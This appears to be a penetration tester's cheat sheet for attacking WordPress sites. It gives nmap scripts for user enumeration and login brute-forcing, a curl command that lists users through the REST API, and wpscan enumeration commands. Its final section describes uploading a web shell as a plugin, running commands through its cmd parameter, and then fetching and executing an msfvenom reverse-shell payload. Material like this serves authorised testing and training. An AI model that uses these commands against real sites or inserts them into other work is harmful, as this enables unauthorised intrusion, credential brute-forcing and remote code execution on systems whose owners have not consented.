# Wordpress

> WordPress is a free and open-source content management system written in PHP and paired with a MySQL or MariaDB database. Features include a plugin architecture and a template system, referred to within WordPress as Themes.
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/WordPress)</cite>

## Related

[Attacking WordPress | HackerTarget.com](https://hackertarget.com/attacking-wordpress/)

## nmap

```bash
nmap -p80 --script http-wordpress-enum --script-args check-latest=true,root=/wordpress -vvv <ip>
```

```bash
nmap -p80 --script http-wordpress-users --script-args basepath=/wp/,limit=100 -vvv <ip>
```

```bash
nmap -sV --script http-wordpress-brute --script-args uri=/wp/wp-login.php -vvv <ip>
```
(may take some time)

## User enum

```bash
curl http://<host>/index.php/wp-json/wp/v2/users
```

## WPScan

WordPress Security Scanner  

Enumerate (PWK2.0 style)
```bash
wpscan -e ap,at,cb,dbe -o wpscan -f cli-no-color --url <url>
```

Enumerate users
```bash
wpscan -e u -o wpscan_users -f cli-no-color --url <url>
```

## Interesting files

[Web Security Geeks - The Security Blog: Pentesting CMS : Wordpress Joomla Drupal](https://www.websecgeeks.com/2015/11/pentesting-cms-wordpress-joomla-drupal.html)
```
Default files: “readme.html”, “license.txt”
Configuration file location: [examplesitefortesting.com]/wp-config.php
Administrator login location: [examplesitefortesting.com]/wp-login.php
Plugin location: [examplesitefortesting.com]/wp-content/plugins
```

## Install reverse shell plugin (authenticated)

```bash
/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
```

Zip the file
```bash
sudo zip plugin-shell.zip plugin-shell.php
```

Install the plugin  
Plugins -> Add New -> Upload Plugin -> Browse -> Install Now

execute command
```bash
curl <host>/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=<cmd>
```

Get a full shell  
* Generate payload using msfvenom
* Upload via SimpleHTTPServer and wget (url encoding!)
* chmod +x 
* Execute
